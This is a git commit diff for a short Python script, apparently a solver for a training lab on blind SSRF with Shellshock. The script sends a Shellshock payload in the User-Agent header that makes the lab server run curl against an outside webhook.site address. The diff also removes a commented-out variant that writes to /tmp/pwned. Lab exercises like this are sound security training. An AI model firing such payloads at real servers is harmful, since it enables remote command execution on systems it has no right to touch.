19e5373ee66041c636afb61fda0eda15aebabeb7
Laplas <61288992+Laplas00@users.noreply.github.com>
2025-06-22 21:25:01 +0300

    n

--- vps-labs-api/__crack_scripts__/blind_ssrf_shellshock.py
+++ vps-labs-api/__crack_scripts__/blind_ssrf_shellshock.py
@@ -1,25 +1,12 @@
-# import requests
-#
-# # Адрес твоего сайта (Flask)
-# LAB_URL = "http://localhost:8000/preview_post/1"  # Подставь свой post_id
-#
-# # Подделанный User-Agent с payload (shellshock или твой кастомный флаг)
-# UA_PAYLOAD = "shellshock-tester"  # Или '() { :; }; echo hacked > /tmp/pwned'
-#
-# # Делаем обычный GET-запрос к preview_post, подставляем User-Agent
-# r = requests.get(LAB_URL, headers={
-#     "User-Agent": UA_PAYLOAD
-# })
-#
-# print("Status:", r.status_code)
-# print("Response preview page:", r.text[:300], "...")
-#
+
 import requests
 
 url = "http://laplasrouse3-blind_ssrf_shellshock.labs-is-here.online/preview_post/1"
+my_webhook = "https://webhook.site/011a51af-70a0-44fd-b8db-728e59646214"
 headers = {
-    "User-Agent": "() { :; }; curl http://YOUR-SERVER/"
+    "User-Agent": f"() {{ :; }}; curl {my_webhook}"
 }
+
 r = requests.get(url, headers=headers)
 print(r.text)
 
